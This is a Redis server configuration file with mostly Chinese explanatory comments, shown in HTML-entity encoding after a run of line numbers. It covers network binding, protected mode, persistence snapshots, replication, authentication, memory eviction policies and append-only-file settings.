82683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882# &#x6307;&#x5B9A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;# ./redis-server /path/to/redis.conf# &#x6307;&#x5B9A;&#x5185;&#x5B58;&#x5927;&#x5C0F;# &#x901A;&#x5E38;&#x4E3A;&#x4EE5;&#x4E0B;&#x5F62;&#x5F0F;&#xFF1A;## 1k =&gt; 1000 bytes# 1kb =&gt; 1024 bytes# 1m =&gt; 1000000 bytes# 1mb =&gt; 1024*1024 bytes# 1g =&gt; 1000000000 bytes# 1gb =&gt; 1024*1024*1024 bytes## &#x4EE5;&#x4E0A;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;################################## INCLUDES #################################### Redis&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;# include /path/to/local.conf# include /path/to/other.conf################################## NETWORK ###################################### &#x76D1;&#x542C;&#x7684;&#x5730;&#x5740;# &#x9ED8;&#x8BA4;&#x76D1;&#x542C;&#x5728;127.0.0.1&#x5730;&#x5740;&#x4E0A;# &#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4E3A;0.0.0.0&#x5730;&#x5740;&#xFF0C;&#x6216;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6216;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x591A;&#x4E2A;&#xFF0C;&#x4F7F;&#x7528;&#x7A7A;&#x683C;&#x5206;&#x9694;&#x5373;&#x53EF;# &#x793A;&#x4F8B;&#xFF1A;## bind 192.168.1.100 10.0.0.1# bind 127.0.0.1 ::1# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~bind 127.0.0.1# protected&#x6A21;&#x5F0F;&#xFF1A;# &#x5F53;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#x5F00;&#x542F;&#x5E76;&#x4E14;&#xFF1A;## 1) bind&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x4E3A;&#x5176;&#x4ED6;&#x5730;&#x5740;# 2) &#x6CA1;&#x6709;&#x914D;&#x7F6E;&#x5BC6;&#x7801;## &#x53EA;&#x80FD;&#x672C;&#x673A;&#x8FDE;&#x63A5;# &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x542F;&#x7528;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#x3002; &#x4EC5;&#x5728;&#x4EE5;&#x4E0B;&#x60C5;&#x51B5;&#x4E0B;&#x624D;&#x5E94;&#x7981;&#x7528;&#x5B83;# &#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#xFF0C;&#x8BF7;&#x5173;&#x95ED;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;protected-mode yes# Redis Server&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#xFF0C;&#x9ED8;&#x8BA4;6379# &#x5982;&#x679C;&#x6307;&#x5B9A;&#x7AEF;&#x53E3; 0&#xFF0C;Redis &#x5C06;&#x4E0D;&#x4F1A;&#x4FA6;&#x542C; TCP &#x5957;&#x63A5;&#x5B57;&#x3002;port 6379# &#x6307;&#x5B9A;tcp-backlog&#x7684;&#x957F;&#x5EA6;# &#x8BF4;&#x660E;&#xFF1A;&#x4EFB;&#x4F55;&#x7684;tcp&#x670D;&#x52A1;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x5230;tcp-backlog&#x529F;&#x80FD;&#xFF0C;backlog&#x662F;&#x4E00;&#x4E2A;&#x7B49;&#x5F85;&#x961F;&#x5217;&#xFF0C;# &#x6BD4;&#x5982;&#xFF1A;redis&#x7684;&#x5E76;&#x53D1;&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;redis&#x6709;&#x53EF;&#x80FD;&#x8FD0;&#x884C;&#x4E0D;&#x8FC7;&#x6765;&#x65F6;&#xFF0C;&#x5C31;&#x8FDE;&#x63A5;&#x672C;&#x5730;&#x7F13;&#x5B58;&#x7B49;&#x961F;&#x5217;&#x90FD;&#x6EE1;&#x4E86;&#x4EE5;&#x540E;&#xFF0C;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;&#x989D;&#x5916;&#x7684;&#x5B58;&#x50A8;&#x5730;&#x65B9;&#xFF0C;&#x628A;&#x65B0;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x6682;&#x5B58;&#x4E0B;&#x6765;&#xFF0C;# &#x800C;&#x8FD9;&#x4E2A;&#x4F4D;&#x7F6E;&#x5219;&#x79F0;&#x4E3A;backlogtcp-backlog 511# Unix socket.## &#x6307;&#x5B9A;&#x4F7F;&#x7528;sock&#x6587;&#x4EF6;&#x901A;&#x4FE1;&#x53CA;sock&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#xFF0C;# &#x5982;&#x679C;&#x670D;&#x52A1;&#x7AEF;&#x548C;&#x5BA2;&#x6237;&#x90FD;&#x5728;&#x540C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x5EFA;&#x8BAE;&#x6253;&#x5F00;&#x6B64;&#x9879;&#xFF0C;# &#x57FA;&#x4E8E;sock&#x65B9;&#x5F0F;&#x901A;&#x4FE1;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x4EA4;&#x6362;&#xFF0C;&#x6570;&#x636E;&#x4E0D;&#x7528;&#x518D;&#x7ECF;&#x8FC7;TCP/TP&#x534F;&#x8BAE;&#x6808;&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#x3001;&#x62C6;&#x5C01;## unixsocket /tmp/redis.sock# &#x5B9A;&#x4E49;sock&#x6587;&#x4EF6;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;# unixsocketperm 700# &#x8868;&#x793A;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x7A7A;&#x95F2;&#xFF08;&#x975E;&#x6D3B;&#x8DC3;&#x3001;&#x6216;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x4EA4;&#x4E92;&#xFF09;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5219;&#x8FDE;&#x63A5;&#x8D85;&#x65F6;# 0&#x8868;&#x793A;&#x4E0D;&#x542F;&#x7528;&#x6B64;&#x529F;&#x80FD;timeout 0# TCP keepalive.# &#x5B9A;&#x4E49;&#x662F;&#x5426;&#x542F;&#x7528;tcp-keepalive&#x529F;&#x80FD;# &#x5355;&#x4F4D;(s/&#x79D2;) &#xFF0C;&#x7528;&#x4E8E;&#x53D1;&#x9001;TCP ACKtcp-keepalive 300################################# GENERAL ###################################### &#x8868;&#x793A;redis&#x5E76;&#x4E0D;&#x4F1A;&#x8FD0;&#x884C;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x8FD0;&#x884C;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x5219;&#x628A;no&#xFF0C;&#x6539;&#x4E3A;yes&#x5373;&#x53EF;&#xFF0C;# &#x5982;&#x679C;&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x811A;&#x672C;&#x542F;&#x52A8;&#xFF0C;&#x5373;&#x4F7F;daemonize&#x4E3A;no&#xFF0C;&#x4E5F;&#x4F1A;&#x8FD0;&#x884C;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;daemonize no# If you run Redis from upstart or systemd, Redis can interact with your# supervision tree. Options:# supervised no - no supervision interaction# supervised upstart - signal upstart by putting Redis into SIGSTOP mode# supervised systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET# supervised auto - detect upstart or systemd method based on# UPSTART_JOB or NOTIFY_SOCKET environment variables# Note: these supervision methods only signal &quot;process is ready.&quot;# They do not enable continuous liveness pings back to your supervisor.supervised no# If a pid file is specified, Redis writes it where specified at startup# and removes it at exit.## When the server runs non daemonized, no pid file is created if none is# specified in the configuration. When the server is daemonized, the pid file# is used even if not specified, defaulting to &quot;/var/run/redis.pid&quot;.## Creating a pid file is best effort: if Redis is not able to create it# nothing bad happens, the server will start and run normally.pidfile /var/run/redis_6379.pid# &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;# debug (&#x5F88;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x5BF9;&#x5F00;&#x53D1;/&#x6D4B;&#x8BD5;&#x5F88;&#x6709;&#x7528;)# verbose (&#x8BB8;&#x591A;&#x5F88;&#x5C11;&#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x4F46;&#x4E0D;&#x50CF;&#x8C03;&#x8BD5;&#x7EA7;&#x522B;&#x90A3;&#x6837;&#x6DF7;&#x4E71;)# notice (&#x9002;&#x5EA6;&#x5197;&#x957F;&#xFF0C;&#x60A8;&#x53EF;&#x80FD;&#x5728;&#x751F;&#x4EA7;&#x4E2D;&#x60F3;&#x8981;&#x4EC0;&#x4E48;)# warning (&#x53EA;&#x8BB0;&#x5F55;&#x975E;&#x5E38;&#x91CD;&#x8981;/&#x5173;&#x952E;&#x7684;&#x6D88;&#x606F;)loglevel notice# &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;logfile /var/log/redis/redis.log# &#x8981;&#x542F;&#x7528;&#x5BF9;&#x7CFB;&#x7EDF;&#x8BB0;&#x5F55;&#x5668;&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#xFF0C;&#x53EA;&#x9700;&#x5C06; &apos;syslog-enabled&apos; &#x8BBE;&#x7F6E;&#x4E3A;&#x662F;&#xFF0C;# &#x5E76;&#x53EF;&#x9009;&#x62E9;&#x66F4;&#x65B0;&#x5176;&#x4ED6;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x53C2;&#x6570;&#x4EE5;&#x6EE1;&#x8DB3;&#x60A8;&#x7684;&#x9700;&#x8981;&#x3002;# syslog-enabled no# &#x5B9A;&#x4E49;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x6807;&#x8BC6;&#x3002;# syslog-ident redis# &#x6307;&#x5B9A;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x5DE5;&#x5177;&#x3002; &#x5FC5;&#x987B;&#x662F; USER &#x6216; LOCAL0-LOCAL7 &#x4E4B;&#x95F4;&#x3002;# syslog-facility local0# &#x5B9A;&#x4E49;redis&#x9ED8;&#x8BA4;&#x6709;&#x591A;&#x5C11;&#x4E2A;databases&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x4E2D;&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;# dbid is a number between 0 and &apos;databases&apos;-1databases 16################################ SNAPSHOTTING ################################# &#x5B9A;&#x4E49;RDB&#x7684;&#x6301;&#x4E45;&#x5316;&#x76F8;&#x5173;# Save the DB on disk:## save &lt;seconds&gt; &lt;changes&gt;## &#x4F7F;&#x7528;save&#x6307;&#x4EE4;&#xFF0C;&#x5E76;&#x6307;&#x5B9A;&#x6BCF;&#x9694;&#x591A;&#x5C11;&#x79D2;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x751F;&#x591A;&#x5927;&#x53D8;&#x5316;&#xFF0C;&#x8FDB;&#x884C;&#x5B58;&#x50A8;# number of write operations against the DB occurred.## &#x5728;&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x884C;&#x4E3A;&#x662F;&#x4FDD;&#x5B58;&#xFF1A;# &#x8868;&#x793A;&#x5728;900&#x79D2;&#xFF08;15&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;1&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;# &#x8868;&#x793A;&#x5728;300&#x79D2;&#xFF08;5&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;10&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;# &#x8868;&#x793A;&#x5728;60&#x79D2;&#xFF08;1&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;10000&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;## &#x5982;&#x679C;redis&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x9700;&#x505A;&#x6301;&#x4E45;&#x5316;&#xFF0C;&#x53EA;&#x662F;&#x4F5C;&#x4E3A;&#x7F13;&#x5B58;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6B64;&#x65B9;&#x5F0F;&#x5173;&#x95ED;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;# save &quot;&quot;save 900 1save 300 10save 60 10000# &#x5728;&#x8FDB;&#x884C;&#x5FEB;&#x7167;&#x5907;&#x4EFD;&#x65F6;&#xFF0C;&#x4E00;&#x65E6;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x7684;&#x8BDD;&#x662F;&#x5426;&#x505C;&#x6B62;&#x5199;&#x64CD;&#x4F5C;stop-writes-on-bgsave-error yes# RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x538B;&#x7F29;&#xFF0C;&#x538B;&#x7F29;&#x4F1A;&#x6D88;&#x8017;CPU# rdbcompression yes# &#x662F;&#x5426;&#x5BF9;RDB&#x6587;&#x4EF6;&#x505A;&#x6821;&#x9A8C;&#x7801;&#x68C0;&#x6D4B;&#xFF0C;# &#x6B64;&#x9879;&#x5B9A;&#x4E49;&#x5728;redis&#x542F;&#x52A8;&#x65F6;&#x52A0;&#x8F7D;RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5BF9;&#x6587;&#x4EF6;&#x68C0;&#x67E5;&#x6821;&#x9A8C;&#x7801;&#xFF0C;# &#x5728;redis&#x751F;&#x6210;RDB&#x6587;&#x4EF6;&#x65F6;&#x4F1A;&#x751F;&#x6210;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#xFF0C;&#x5728;redis&#x518D;&#x6B21;&#x542F;&#x52A8;&#x6216;&#x88C5;&#x8F7D;RDB&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x662F;&#x5426;&#x68C0;&#x6D4B;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#xFF0C;# &#x5982;&#x679C;&#x68C0;&#x6D4B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x6D88;&#x8017;&#x65F6;&#x95F4;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;redis&#x542F;&#x52A8;&#x65F6;&#x6162;&#xFF0C;&#x4F46;&#x662F;&#x80FD;&#x591F;&#x5224;&#x65AD;RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4EA7;&#x751F;&#x9519;&#x8BEF;# rdbchecksum yes# &#x5B9A;&#x4E49;RDB&#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;# dbfilename dump.rdb# &#x5B9A;&#x4E49;RDB&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x7684;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;# dir /var/lib/redis################################# REPLICATION ################################## &#x914D;&#x7F6E;&#x4E3B;&#x4ECE;&#x76F8;&#x5173;## &#x6B64;&#x9879;&#x4E0D;&#x542F;&#x7528;&#x65F6;&#xFF0C;&#x5219;&#x4E3A;&#x4E3B;&#xFF0C;&#x5982;&#x679C;&#x542F;&#x52A8;&#x5219;&#x4E3A;&#x4ECE;&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x8981;&#x6307;&#x660E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#xFF0C;&#x7AEF;&#x53E3;# slaveof &lt;masterip&gt; &lt;masterport&gt;# &#x5982;&#x679C;&#x4E3B;&#x670D;&#x52A1;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#x8BA4;&#x8BC1;&#xFF0C;&#x90A3;&#x4E48;&#x4ECE;&#x7684;&#x5219;&#x9700;&#x8981;&#x542F;&#x7528;&#x6B64;&#x9879;&#x5E76;&#x6307;&#x660E;&#x4E3B;&#x7684;&#x8BA4;&#x8BC1;&#x5BC6;&#x7801;&#xFF1A;# # masterauth &lt;master-password&gt;# &#x5B9A;&#x4E49;&#x4ECE;&#x670D;&#x52A1;&#x5BF9;&#x4E3B;&#x670D;&#x52A1;&#x662F;&#x5426;&#x4E3A;&#x53EA;&#x8BFB;&#xFF08;&#x4EC5;&#x590D;&#x5236;&#xFF09;slave-serve-stale-data yes# You can configure a slave instance to accept writes or not. Writing against# a slave instance may be useful to store some ephemeral data (because data# written on a slave will be easily deleted after resync with the master) but# may also cause problems if clients are writing to it because of a# misconfiguration.## Since Redis 2.6 by default slaves are read-only.## Note: read only slaves are not designed to be exposed to untrusted clients# on the internet. It&apos;s just a protection layer against misuse of the instance.# Still a read only slave exports by default all the administrative commands# such as CONFIG, DEBUG, and so forth. To a limited extent you can improve# security of read only slaves using &apos;rename-command&apos; to shadow all the# administrative / dangerous commands.slave-read-only yes# Replication SYNC strategy: disk or socket.## -------------------------------------------------------# WARNING: DISKLESS REPLICATION IS EXPERIMENTAL CURRENTLY# -------------------------------------------------------## New slaves and reconnecting slaves that are not able to continue the replication# process just receiving differences, need to do what is called a &quot;full# synchronization&quot;. An RDB file is transmitted from the master to the slaves.# The transmission can happen in two different ways:## 1) Disk-backed: The Redis master creates a new process that writes the RDB# file on disk. Later the file is transferred by the parent# process to the slaves incrementally.# 2) Diskless: The Redis master creates a new process that directly writes the# RDB file to slave sockets, without touching the disk at all.## With disk-backed replication, while the RDB file is generated, more slaves# can be queued and served with the RDB file as soon as the current child producing# the RDB file finishes its work. With diskless replication instead once# the transfer starts, new slaves arriving will be queued and a new transfer# will start when the current one terminates.## When diskless replication is used, the master waits a configurable amount of# time (in seconds) before starting the transfer in the hope that multiple slaves# will arrive and the transfer can be parallelized.## With slow disks and fast (large bandwidth) networks, diskless replication# works better.repl-diskless-sync no# When diskless replication is enabled, it is possible to configure the delay# the server waits in order to spawn the child that transfers the RDB via socket# to the slaves.## This is important since once the transfer starts, it is not possible to serve# new slaves arriving, that will be queued for the next RDB transfer, so the server# waits a delay in order to let more slaves arrive.## The delay is specified in seconds, and by default is 5 seconds. To disable# it entirely just set it to 0 seconds and the transfer will start ASAP.repl-diskless-sync-delay 5# Slaves send PINGs to server in a predefined interval. It&apos;s possible to change# this interval with the repl_ping_slave_period option. The default value is 10# seconds.## repl-ping-slave-period 10# The following option sets the replication timeout for:## 1) Bulk transfer I/O during SYNC, from the point of view of slave.# 2) Master timeout from the point of view of slaves (data, pings).# 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).## It is important to make sure that this value is greater than the value# specified for repl-ping-slave-period otherwise a timeout will be detected# every time there is low traffic between the master and the slave.## repl-timeout 60# Disable TCP_NODELAY on the slave socket after SYNC?## If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and# less bandwidth to send data to slaves. But this can add a delay for# the data to appear on the slave side, up to 40 milliseconds with# Linux kernels using a default configuration.## If you select &quot;no&quot; the delay for data to appear on the slave side will# be reduced but more bandwidth will be used for replication.## By default we optimize for low latency, but in very high traffic conditions# or when the master and slaves are many hops away, turning this to &quot;yes&quot; may# be a good idea.repl-disable-tcp-nodelay no# Set the replication backlog size. The backlog is a buffer that accumulates# slave data when slaves are disconnected for some time, so that when a slave# wants to reconnect again, often a full resync is not needed, but a partial# resync is enough, just passing the portion of data the slave missed while# disconnected.## The bigger the replication backlog, the longer the time the slave can be# disconnected and later be able to perform a partial resynchronization.## The backlog is only allocated once there is at least a slave connected.## repl-backlog-size 1mb# After a master has no longer connected slaves for some time, the backlog# will be freed. The following option configures the amount of seconds that# need to elapse, starting from the time the last slave disconnected, for# the backlog buffer to be freed.## A value of 0 means to never release the backlog.## repl-backlog-ttl 3600# The slave priority is an integer number published by Redis in the INFO output.# It is used by Redis Sentinel in order to select a slave to promote into a# master if the master is no longer working correctly.## A slave with a low priority number is considered better for promotion, so# for instance if there are three slaves with priority 10, 100, 25 Sentinel will# pick the one with priority 10, that is the lowest.## However a special priority of 0 marks the slave as not able to perform the# role of master, so a slave with priority of 0 will never be selected by# Redis Sentinel for promotion.## By default the priority is 100.slave-priority 100# It is possible for a master to stop accepting writes if there are less than# N slaves connected, having a lag less or equal than M seconds.## The N slaves need to be in &quot;online&quot; state.## The lag in seconds, that must be &lt;= the specified value, is calculated from# the last ping received from the slave, that is usually sent every second.## This option does not GUARANTEE that N replicas will accept the write, but# will limit the window of exposure for lost writes in case not enough slaves# are available, to the specified number of seconds.## For example to require at least 3 slaves with a lag &lt;= 10 seconds use:## min-slaves-to-write 3# min-slaves-max-lag 10## Setting one or the other to 0 disables the feature.## By default min-slaves-to-write is set to 0 (feature disabled) and# min-slaves-max-lag is set to 10.# A Redis master is able to list the address and port of the attached# slaves in different ways. For example the &quot;INFO replication&quot; section# offers this information, which is used, among other tools, by# Redis Sentinel in order to discover slave instances.# Another place where this info is available is in the output of the# &quot;ROLE&quot; command of a masteer.## The listed IP and address normally reported by a slave is obtained# in the following way:## IP: The address is auto detected by checking the peer address# of the socket used by the slave to connect with the master.## Port: The port is communicated by the slave during the replication# handshake, and is normally the port that the slave is using to# list for connections.## However when port forwarding or Network Address Translation (NAT) is# used, the slave may be actually reachable via different IP and port# pairs. The following two options can be used by a slave in order to# report to its master a specific set of IP and port, so that both INFO# and ROLE will report those values.## There is no need to use both the options if you need to override just# the port or the IP address.## slave-announce-ip 5.5.5.5# slave-announce-port 1234################################## SECURITY #################################### Require clients to issue AUTH &lt;PASSWORD&gt; before processing any other# commands. This might be useful in environments in which you do not trust# others with access to the host running redis-server.## This should stay commented out for backward compatibility and because most# people do not need auth (e.g. they run their own servers).## Warning: since Redis is pretty fast an outside user can try up to# 150k passwords per second against a good box. This means that you should# use a very strong password otherwise it will be very easy to break.## requirepass foobared# Command renaming.## It is possible to change the name of dangerous commands in a shared# environment. For instance the CONFIG command may be renamed into something# hard to guess so that it will still be available for internal-use tools# but not available for general clients.## Example:## rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52## It is also possible to completely kill a command by renaming it into# an empty string:## rename-command CONFIG &quot;&quot;## Please note that changing the name of commands that are logged into the# AOF file or transmitted to slaves may cause problems.################################### LIMITS ##################################### &#x5B9A;&#x4E49;&#x4E0E;&#x8FDE;&#x63A5;&#x548C;&#x8D44;&#x6E90;&#x9650;&#x5236;&#x76F8;&#x5173;&#x7684;&#x914D;&#x7F6E;# Set the max number of connected clients at the same time. By default# this limit is set to 10000 clients, however if the Redis server is not# able to configure the process file limit to allow for the specified limit# the max number of allowed clients is set to the current file limit# minus 32 (as Redis reserves a few file descriptors for internal uses).## &#x5B9A;&#x4E49;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x9650;&#x5236;&#xFF08;&#x5E76;&#x53D1;&#x6570;&#xFF09;## maxclients 10000# &#x5B9A;&#x4E49;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6700;&#x5927;&#x5185;&#x5B58;&#xFF0C;&#x9ED8;&#x8BA4;&#x6B64;&#x9879;&#x5173;&#x95ED;&#xFF0C;&#x8868;&#x793A;&#x6700;&#x5927;&#x5C06;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6700;&#x5927;&#x53EF;&#x7528;&#x5185;&#x5B58;# maxmemory &lt;bytes&gt;# MAXMEMORY POLICY: how Redis will select what to remove when maxmemory# is reached. You can select among five behaviors:## volatile-lru -&gt; remove the key with an expire set using an LRU algorithm# allkeys-lru -&gt; remove any key according to the LRU algorithm# volatile-random -&gt; remove a random key with an expire set# allkeys-random -&gt; remove a random key, any key# volatile-ttl -&gt; remove the key with the nearest expire time (minor TTL)# noeviction -&gt; don&apos;t expire at all, just return an error on write operations## Note: with any of the above policies, Redis will return an error on write# operations, when there are no suitable keys for eviction.## At the date of writing these commands are: set setnx setex append# incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd# sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby# zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby# getset mset msetnx exec sort## The default is:## maxmemory-policy noeviction# LRU and minimal TTL algorithms are not precise algorithms but approximated# algorithms (in order to save memory), so you can tune it for speed or# accuracy. For default Redis will check five keys and pick the one that was# used less recently, you can change the sample size using the following# configuration directive.## The default of 5 produces good enough results. 10 Approximates very closely# true LRU but costs a bit more CPU. 3 is very fast but not very accurate.## maxmemory-samples 5############################## APPEND ONLY MODE ################################ &#x5B9A;&#x4E49;AOF&#x7684;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#xFF0C;&#x4E00;&#x65E6;&#x6709;&#x67D0;&#x4E00;&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x5C06;&#x4FEE;&#x6539;&#x952E;&#x7684;&#x547D;&#x4EE4;&#x9644;&#x52A0;&#x5230;&#x547D;&#x4EE4;&#x5217;&#x8868;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;## &#x5B9A;&#x4E49;&#x662F;&#x5426;&#x5F00;&#x542F;&#x6B64;&#x529F;&#x80FD;&#xFF0C;no&#x8868;&#x793A;&#x5173;&#x95ED;&#xFF0C;yes&#x8868;&#x793A;&#x5F00;&#x542F;# &#x8BF4;&#x660E;&#xFF1A;RDB&#x548C;AOF&#x4E24;&#x79CD;&#x6301;&#x4E45;&#x529F;&#x80FD;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x542F;&#x7528;&#xFF0C;&#x4E24;&#x8005;&#x4E0D;&#x5F71;&#x54CD;appendonly no# &#x5B9A;&#x4E49;AOF&#x6587;&#x4EF6; (default: &quot;appendonly.aof&quot;)# appendfilename &quot;appendonly.aof&quot;## If unsure, use &quot;everysec&quot;.# &#x8868;&#x793A;&#x6BCF;&#x6B21;&#x6536;&#x5230;&#x5199;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x7ACB;&#x5373;&#x5199;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#x7684;AOF&#x6587;&#x4EF6;&#xFF0C;# &#x867D;&#x7136;&#x662F;&#x6700;&#x597D;&#x7684;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F;&#x6BCF;&#x6B21;&#x6709;&#x5199;&#x547D;&#x4EE4;&#x65F6;&#x90FD;&#x4F1A;&#x6709;&#x78C1;&#x76D8;&#x7684;I/O&#x64CD;&#x4F5C;&#xFF0C;&#x5BB9;&#x6613;&#x5F71;&#x54CD;redis&#x7684;&#x6027;&#x80FD;# appendfsync always# &#x8868;&#x793A;&#x6BCF;&#x79D2;&#x949F;&#x5199;&#x4E00;&#x6B21;&#xFF0C;&#x4E0D;&#x7BA1;&#x6BCF;&#x79D2;&#x949F;&#x6536;&#x5230;&#x591A;&#x5C11;&#x4E2A;&#x5199;&#x8BF7;&#x6C42;&#x90FD;&#x5F80;&#x78C1;&#x76D8;&#x4E2D;&#x7684;AOF&#x6587;&#x4EF6;&#x4E2D;&#x5199;&#x4E00;&#x6B21;# appendfsync everysec# &#x8868;&#x793A;append&#x529F;&#x80FD;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x63D0;&#x4EA4;&#x7ED9;OS&#xFF0C;&#x7531;OS&#x81EA;&#x884C;&#x51B3;&#x5B9A;&#x662F;&#x5982;&#x4F55;&#x5199;&#x7684;# # appendfsync no### 